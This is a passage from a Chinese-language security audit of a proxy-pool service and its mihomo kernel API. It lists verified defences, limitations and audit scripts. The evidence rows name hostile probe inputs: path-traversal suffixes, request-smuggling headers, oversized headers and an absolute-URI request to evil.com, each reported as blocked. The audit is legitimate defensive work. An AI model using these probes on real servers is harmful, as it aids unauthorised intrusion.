| E-10 | **顶层 harden 有效**：`allow-lan=false`、`ipv6=false`、`log-level=silent`、`find-process-mode=off`、`geo-auto-update=false`；`tun` 与 `bind-address` 在解析后的顶层键里确实不存在 | A5 ②（`yaml.safe_load` 后检查顶层键，而不是文本匹配） |
| E-11 | **内核 API 确实需要密钥**：错误 secret / 空 secret → 401 | A5 ③ |
| E-12 | **超大请求头被内建限制拦住、无内存放大**：70000 字节 Host → `431 Line too long`；70000 字节 URL → `414 URI Too Long`；200 次状态页请求工作集 35.9 → 36.1 MB | A4 ③ |
| E-13 | **无请求走私**：重复 `Content-Length` → 501；`Transfer-Encoding: chunked` 走私探测 → 501；每个连接只处理一个请求（响应是 `HTTP/1.0`，无 keep-alive）；`POST/OPTIONS/TRACE` 全部 501 | A2 ②、A1 |
| E-14 | **`verge_running()` 防护有效**：本机 Clash Verge 正在运行时 `inject_verge` 直接拒绝写入并给出指引（实测返回 `False`） | A7 ⓪ |
| E-15 | **写入失败不会破坏原文件**：只读 `profiles.yaml` 下写入抛异常，但原文件内容逐字节不变 | A7 ③ |
| E-16 | **绝对 URI 形式的请求行不构成绕过**：`GET http://evil.com/sub/pool.yaml?token=…` 仍要通过 Host 校验与令牌校验 | A1 |
| E-17 | **`_resolve_sub` 的"越界"只是同一文件的别名**：`/sub/pool.yaml::$DATA`、`/sub/pool.yaml:secret`、`/sub/pool.yaml.`、`/sub/pool.yaml%20`、`/sub/pool.yaml%00` 都返回 `out/pool.yaml` 本身（15156 字节），**没有**读到 `out/` 之外；`/sub/C:pool.yaml` 被 `startswith(base)` 拦住 | A2 ① |

---

## 局限与未覆盖

1. **POSIX 路径未实测**：`kernel_preexec()` 的 `setrlimit` + `setuid(nobody)` 在 Windows 上直接 `return None`，无法实跑。静态看逻辑合理（先设 rlimit 再降权、全部 try/except 兜底），但 `preexec_fn` 在**多线程**程序里有已知的 fork 死锁风险（CPython 文档明确警告）。`probe_real` 里 `subprocess` 调用与 `ThreadPoolExecutor` 不在同一段，风险较低，仍建议在 POSIX 上改成 `start_new_session` + 外部 `setpriv`/`su` 或 `subprocess` 的 `user=` 参数（Python 3.9+）。
2. **未对 `bin/mihomo.exe` 二进制本身做逆向或漏洞分析**（61 MB Go 二进制）。本报告的结论只基于它的**运行行为**（监听地址、API 鉴权、CORS、字段接受度）。
3. **未审计公开订阅源的数据链路**（解析、指纹、去重、产物内容）——那是审计 B 的范围。本报告只覆盖 A-02 里"节点名最终渲染进 HTML"这一环。
4. **A-01 的 CORS 行为是 mihomo 的默认实现**，不是 `pool.py` 写的；但 `pool.py` 选择暴露这个端口、并把密钥写死，所以缓解责任在 `pool.py` 侧。另外**节点凭据（uuid/password）不在 Clash API 的响应里**（实测 `/configs` 的 `proxies` 为空、无凭据明文，`/proxies` 只有元数据），所以 A-01 不能用来直接窃取节点凭据——能读的是运行配置、规则、连接状态与节点元数据，能写的是 `/configs`。
5. `/connections` 端点在本次实测时无活动连接，未取到条目，因此没有量化它到底能读出多少目标信息；从端点可读这一事实出发，建议按"能读当前连接目标"来评估。
6. `audit/A4_dos.py` 的慢连接测试只做到 300 条并发（本机资源保护）；更高规模下的具体降级点没有测出来，报告里只陈述"线程数线性增长"这个已实证的事实。

---

## 验证脚本清单

| 脚本 | 覆盖 |
|---|---|
| `audit/A1_gate.py` | 访问控制矩阵：Host 17 例、令牌 22 例、请求形式 15 例 |
| `audit/A2_traversal.py` | 路径穿越 52 例 + 裸 socket 报文级 11 例（多重 Host、走私、超长头） |
| `audit/A3_token_log.py` | 令牌熵/恒定时间、非 ASCII 崩溃与不落日志、明文日志、obs-fold 注入 |
| `audit/A3b_logwipe.py` | 日志被外部噪声撑大并触发 `unlink` 清空 |
| `audit/A4_dos.py` | traceback 日志放大、慢连接线程膨胀、内存放大、超大请求头 |
| `audit/A5_kernel.py` | `kernel_env` 泄漏扫描（含注入探针）、harden 绕过、真启动内核 + netstat + 鉴权 + CORS |
| `audit/A5b_api_surface.py` | 内核 API 到底能读能写什么（`/configs` `/proxies` `/rules` `/connections`；PATCH 改 mode、改 allow-lan+bind-address 把端口暴露到 0.0.0.0） |
| `audit/A6_xss.py` | 节点名 → 入池 → `report.json` → 状态页 HTTP 的完整 XSS 链路 |
| `audit/A7_verge.py` | `inject_verge` 备份/原子性/失败/并发（只操作 `audit/_tmp/verge` 假目录） |

所有脚本的原始输出在 `audit/_tmp/*.out`。脚本只操作 `audit/_tmp/` 下的临时路径；唯一对生产状态的改动是向 `state/access.log`、`state/daemon.log` 追加了少量测试请求记录（这是服务本身的行为，无法避免）。
